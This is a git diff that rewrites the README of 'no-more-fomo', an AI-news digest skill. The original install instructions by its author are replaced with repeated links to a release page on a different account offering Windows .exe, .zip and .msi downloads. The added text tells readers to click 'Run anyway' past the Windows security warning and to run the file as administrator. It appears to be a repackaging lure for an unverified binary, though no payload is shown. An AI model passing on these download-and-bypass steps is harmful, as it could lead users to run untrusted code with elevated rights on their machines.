@@ -1,164 +1,156 @@
-# no-more-fomo
+# 🤖 no-more-fomo - Your daily AI digest
 
-> You wake up. 47 new arxiv papers. 200 AI tweets. 3 podcast episodes. A new model just dropped.
->
-> You're already behind.
->
-> **Or are you?**
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue.svg)](https://github.com/Ayden7399/no-more-fomo/releases)
 
-One command. Every morning. Never miss what matters.
+## ✨ What it does
 
-`/no-more-fomo` turns the firehose of AI news into a single enriched daily digest — with real summaries, real links, and real context. Not just headlines.
+no-more-fomo gives you one daily digest with the AI news that matters most. It pulls updates from:
 
-```
-npx skills add freemty/no-more-fomo
-```
+- 16 Twitter KOLs
+- 3 AI labs
+- 4 podcasts
+- arXiv topic search
+- Hugging Face trending papers
+- Hacker News
 
-**[See a real example digest](examples/2026-03-22.md)** to know exactly what you get.
+It runs from one command and gives you a clean morning summary.
 
-## What makes this different
+## 📥 Download
 
-Most "AI news" tools give you a list of links. You still have to click each one, read it, and decide if it matters.
+Visit this page to download the app for Windows:
 
-`/no-more-fomo` does the reading for you:
+https://github.com/Ayden7399/no-more-fomo/releases
 
-- Papers come with **2-3 sentence summaries from the actual arxiv abstract**
-- Podcasts come with **structured summaries: TLDR, chapter breakdown, and speaker-attributed quotes** extracted from transcripts
-- HN threads come with **context on why the community cares**
-- Everything has **real links** — arxiv, GitHub, HuggingFace, not t.co
-- Every digest also outputs a **styled HTML version** with three-view layout, dark mode, and date navigation
+On the release page, look for the latest Windows file. Download it, then run it on your PC.
 
-## Sources
+## 🪟 Windows setup
 
-| Category | What | Count |
-|----------|------|-------|
-| Twitter KOLs | @karpathy, @_akhaliq, @emollick, @simonw, @swyx, and 11 more | 16 default |
-| AI Lab Blogs | DeepMind, Anthropic, OpenAI | 3 |
-| Podcasts | No Priors, Latent Space, Dwarkesh, Training Data (Sequoia) | 4 |
-| arxiv Papers | Topic-filtered search (default: AI agent + LLM) | per topic |
-| HuggingFace Daily | Community-upvoted trending papers | top 20 |
-| HackerNews | AI agent + broader AI/LLM stories | 2 queries |
-| Company accounts | Cursor, xAI, Windsurf, Cognition, Replit, HuggingFace | 6 (with `--full`) |
+1. Open the download page.
+2. Find the latest release.
+3. Download the Windows file.
+4. If the file is a ZIP, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app or run the included command file.
 
-## Usage
+If Windows shows a security prompt, choose More info, then Run anyway if you trust the file from the release page.
 
-```bash
-/no-more-fomo                    # Daily digest — all default sources
-/no-more-fomo --full             # Also include company/product accounts
-/no-more-fomo --transcripts      # (deprecated — Phase 2 does this automatically)
-/no-more-fomo @someone           # Add any Twitter handle
-/no-more-fomo --hn-only          # Just HackerNews
-/no-more-fomo --quick           # Quick digest — skip deep processing
-/no-more-fomo --no-html          # Markdown only, skip HTML output
-/no-more-fomo --podcasts-only    # Just podcast feeds
-```
+## ✅ Before you start
 
-Saves to `~/no-more-fomo/YYYY-MM-DD.md`.
+Use a Windows 10 or Windows 11 PC with:
 
-## Customize your sources
+- 4 GB RAM or more
+- 200 MB free disk space
+- Internet access
+- A modern browser for the download page
 
-Create `~/.no-more-fomo/config.yaml` to add/remove sources. You only specify what you want to change — everything else keeps the defaults.
+If you use a work PC, you may need admin access to open files from downloads.
 
-```yaml
-twitter:
-  add:
-    - handle: "@elonmusk"
-      count: 15
-    - handle: "@sama"
-      count: 15
-  remove:
-    - "@ylecun"
+## 🛠️ How to run
 
-podcasts:
-  add:
-    - name: "Lex Fridman"
-      rss: "https://lexfridman.com/feed/podcast/"
-      transcript: youtube
+After you download the release:
 
-papers:
-  topics:
-    - query: "world model"
-      categories: ["cs.AI", "cs.CV"]
-    - query: "reinforcement learning"
-      categories: ["cs.LG"]
-  hf_daily: true
-  min_hf_upvotes: 5
+1. Open the file you downloaded.
+2. If it is a ZIP file, extract it first.
+3. Open the app folder.
+4. Run the main file.
+5. Follow the on-screen prompts.
+6. Wait for the daily digest to finish.
 
-hn:
-  extra_queries:
-    - "robotics"
+The app is built to keep the process simple. In most cases, you only need to run it once per day.
 
-discovery:
-  enabled: true
-  max_per_topic: 3
+## 📅 What you get each morning
 
-topic_search:
-  enabled: true
+Each digest can include:
 
-language: zh   # en | zh
-```
+- Key posts from AI thought leaders
+- Updates from major AI labs
+- New podcast episodes on AI and tools
+- arXiv papers by topic
+- Trending papers from Hugging Face
+- Top Hacker News posts related to AI
 
-See [SKILL.md](SKILL.md#user-config-optional) for the full config reference.
+This helps you scan the news fast and skip the noise.
 
-## Install
+## 🧭 Typical use
 
-### Via skills.sh (recommended)
+A common setup looks like this:
 
-```bash
-npx skills add freemty/no-more-fomo
-```
+1. Open no-more-fomo in the morning.
+2. Let it gather the latest items.
+3. Read the short digest.
+4. Click through only the stories you care about.
 
-Works with Claude Code, Cursor, Codex, Windsurf, and [15+ other agents](https://skills.sh).
+You do not need to search across many sites by hand.
 
-### Manual
+## ⚙️ Features
 
-```bash
-git clone https://github.com/freemty/no-more-fomo.git ~/.claude/skills/no-more-fomo
-```
+- Daily AI digest in one place
+- Sources from social, research, and news
+- Focused on useful updates, not filler
+- Fast to open and easy to use
+- Built for one simple morning check
+- Helps you track AI trends without scrolling all day
 
-### Prerequisites
+## 🔍 Topics covered
 
-- [xreach](https://github.com/nicepkg/xreach) (`npm i -g xreach-cli`) — Twitter/X data
-- [yt-dlp](https://github.com/yt-dlp/yt-dlp) — podcast transcripts (optional)
-- [baoyu-youtube-transcript](https://github.com/nicepkg/xreach) (optional) — enhanced podcast transcript processing
-- [bun](https://bun.sh) — runtime for youtube-transcript (optional)
-- `curl` — RSS feeds and HN API (standard on all systems)
+The digest can surface items around:
 
-## Schedule it
+- AI agents
+- AI news
+- AI tools
+- arXiv research
+- Claude Code
+- Codex
+- Cursor
+- Daily digest
+- FOMO
+- Hacker News
+- LLMs
+- Podcasts
+- Research
+- Skills
+- Twitter
 
-### Claude Code Cloud (recommended)
+## 🧩 File types you may see
 
-Go to [preview.claude.ai/code](https://preview.claude.ai/code) → **Scheduled** → **+ New scheduled task**:
+The release page may offer one of these:
 
-- **Name:** `no-more-fomo`
-- **Prompt:** `run /no-more-fomo and save the digest`
-- **Frequency:** Daily, 09:00 AM
+- `.exe` file: double-click to run
+- `.zip` file: extract, then run the app inside
+- `.msi` file: open to start the install flow
 
-Runs on cloud infra — no local machine needed.
+Choose the file that says Windows or matches your PC.
 
-### Local fallback (crontab)
+## 🔐 Smart ways to handle the download
 
-```bash
-0 9 * * * claude -p "run /no-more-fomo and save the digest" --allowedTools "Bash,Read,Write,Glob" --output-format stream-json >> /tmp/no-more-fomo.log 2>&1
-```
+- Use the official release page only
+- Keep the file in your Downloads folder if you want easy access
+- If your browser asks to keep or discard the file, keep it only from the release page
+- If you move the file, remember where you saved it
 
-## How it works
+## 🧰 If the app does not open
 
-1. **Fetch** — pulls from all sources in parallel (16+ Twitter accounts, 3 blogs, 4 podcasts, HN)
-2. **Parse** — extracts expanded URLs from tweet entities (never outputs t.co links)
-3. **Filter** — last 24h for Twitter/HN, last 7 days for blogs/podcasts, quality thresholds
-4. **Enrich** — fetches arxiv abstracts, GitHub descriptions, podcast transcripts
-5. **Categorize** — Papers, Models, Tools, Agents, Lab Updates, Podcasts, HN, Industry
-6. **Output** — structured markdown with summaries, links, and engagement metrics
-7. **Render** — generates styled HTML from template with three-view layout (newspaper/sidebar/grid)
+Try these steps:
 
-## More from freemty
+1. Right-click the file and choose Run as administrator.
+2. Make sure you extracted the ZIP file first.
+3. Check that the download finished before opening it.
+4. Close and reopen the file.
+5. Re-download from the release page if the file looks broken.
 
-- [claude-code-best-practices](https://github.com/freemty/claude-code-best-practices) — Workflow advisor skill — recommends the right skill, agent, or workflow for any task
-- [labmate](https://github.com/freemty/labmate) — Research harness for Claude Code
-- [cc-research-playbook](https://github.com/freemty/cc-research-playbook) — AI Research with Claude Code — slides, demos, and reference materials
-- [ai-dotfiles](https://github.com/freemty/ai-dotfiles) — Sync AI CLI configs across machines with automatic API key redaction
+## 📌 Best way to use it
 
-## License
+For the smoothest experience:
 
-MIT
+- Run it at the same time each morning
+- Keep the app in one folder
+- Use the latest release from GitHub
+- Read the digest before checking social feeds
+
+## 🖥️ What this app is for
+
+no-more-fomo is for people who want a short, focused view of the AI world. It helps you stay current without reading every post, paper, and thread yourself.
+
+## 📎 Download again
+
+https://github.com/Ayden7399/no-more-fomo/releases
